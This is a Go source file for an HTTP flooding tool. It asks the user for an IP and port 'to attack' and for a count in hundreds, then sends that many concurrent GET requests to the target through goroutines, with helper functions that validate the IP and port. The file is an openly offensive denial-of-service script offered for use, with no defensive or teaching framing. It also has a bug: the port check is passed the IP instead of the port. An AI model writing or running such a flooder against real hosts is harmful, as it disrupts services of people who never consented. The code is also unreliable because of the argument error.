package main

import (
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

var ip string
var port = "8080"
var hundreds = "100"
var verbose = false

func main() {
	response := "n"

	for response != "y" && response != "Y" {
		fmt.Println("Hello there! Type an ip to attack:")
		_, _ = fmt.Scan(&ip)

		fmt.Println("Type the port to attack:")
		_, _ = fmt.Scan(&port)

		fmt.Println("Okay. How many HUNDREDS(100) of requests should we send?:")
		_, _ = fmt.Scan(&hundreds)

		fmt.Println("Do you want to see requests output? (y/n):")
		var ans string
		_, _ = fmt.Scan(&ans)
		if ans == "y" || ans == "Y" {
			verbose = true
		}

		fmt.Printf(
			"Your attack plan is: %s:%s/ by %s00 requests. Correct? (y/n):",
			ip,
			port,
			hundreds)
		_, _ = fmt.Scan(&response)
	}

	hundredsNum, err := strconv.Atoi(hundreds)
	if err != nil {
		fmt.Printf("%s is not a number", hundreds)
		return
	}

	if err = CheckIP(ip); err != nil {
		fmt.Printf("incorrect ip address: %s", err.Error())
		return
	}

	if err = CheckPort(ip); err != nil {
		fmt.Printf("incorrect port: %s", err.Error())
		return
	}

	wg := sync.WaitGroup{}

	for i := 0; i < hundredsNum; i++ {
		for j := 0; j < 100; j++ {
			wg.Add(1)
			go func(wg *sync.WaitGroup, number int) {
				number++
				url := fmt.Sprintf("http://%s:%s/", ip, port)
				req, _ := http.NewRequest("GET", url, nil)
				_, _ = http.DefaultClient.Do(req)
				if verbose {
					fmt.Printf("request №%d finished\n", number)
				}
				wg.Done()
			}(&wg, i*100+j+1)
		}
	}

	wg.Wait()
}

func CheckIP(IP string) error {
	octets := strings.Split(IP, ".")
	if len(octets) != 4 {
		return errors.New("incorrect number of dots (octets)")
	}

	for i := 0; i < 4; i++ {
		octet, err := strconv.Atoi(octets[i])
		if err != nil {
			return errors.New(fmt.Sprintf("%s octet is not a number", octetName(i+1)))
		}

		if octet < 0 {
			return errors.New(fmt.Sprintf("%s octet is less than 0", octetName(i+1)))
		}

		if octet > 255 {
			return errors.New(fmt.Sprintf("%s octet is greater than 255", octetName(i+1)))
		}
	}

	return nil
}

func octetName(i int) string {
	switch i {
	case 1:
		return "first"
	case 2:
		return "second"
	case 3:
		return "third"
	case 4:
		return "fourth"
	default:
		return ""
	}
}

func CheckPort(port string) error {
	portNum, err := strconv.Atoi(port)
	if err != nil {
		return errors.New(fmt.Sprintf("%s is not a number", port))
	}

	if portNum < 1 {
		return errors.New(fmt.Sprintf("%d is less than 1", portNum))
	}

	if portNum > 65535 {
		return errors.New(fmt.Sprintf("%d is greater than 65535", portNum))
	}

	return nil
}
